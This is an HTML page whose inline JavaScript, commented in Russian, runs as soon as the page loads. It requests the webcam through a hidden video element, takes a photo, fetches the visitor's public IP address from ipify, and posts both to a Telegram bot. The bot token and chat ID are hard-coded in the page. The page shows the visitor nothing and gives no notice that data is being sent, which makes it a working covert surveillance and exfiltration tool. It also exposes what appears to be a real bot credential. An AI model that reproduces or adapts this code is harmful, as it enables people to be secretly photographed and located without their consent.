<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Send Photo and IP to Telegram</title>
</head>
<body>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>

    <script>
        // Используем ваши данные
        const botToken = '7399220684:AAHNirX_Nk3iLly349TKc-8v0WwvD1t1TEY'; // Ваш токен бота
        const chatId = '6468946124'; // ID чата, куда отправлять сообщения
        const apiUrl = 'https://api.ipify.org?format=json';

        // Функция для отправки фото в Telegram
        function sendPhotoToTelegram(blob, ip) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', `User IP: ${ip}`);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                console.log('Photo sent:', data);
            })
            .catch(error => {
                console.error('Error sending photo:', error);
            });
        }

        // Запрашиваем доступ к камере и отправляем фото и IP
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => {
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Создаем элемент для захвата кадра
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);

                // Захватываем изображение
                imageCapture.takePhoto()
                    .then(blob => {
                        // Получаем IP-адрес пользователя
                        fetch(apiUrl)
                            .then(response => response.json())
                            .then(data => {
                                const ip = data.ip;

                                // Отправляем фото и IP-адрес в Telegram
                                sendPhotoToTelegram(blob, ip);
                            })
                            .catch(error => {
                                console.error('Error fetching IP:', error);
                            });
                    })
                    .catch(error => {
                        console.error('Error taking photo:', error);
                    });
            })
            .catch(error => {
                console.error("Error accessing the camera:", error);
            });
    </script>
</body>
</html>
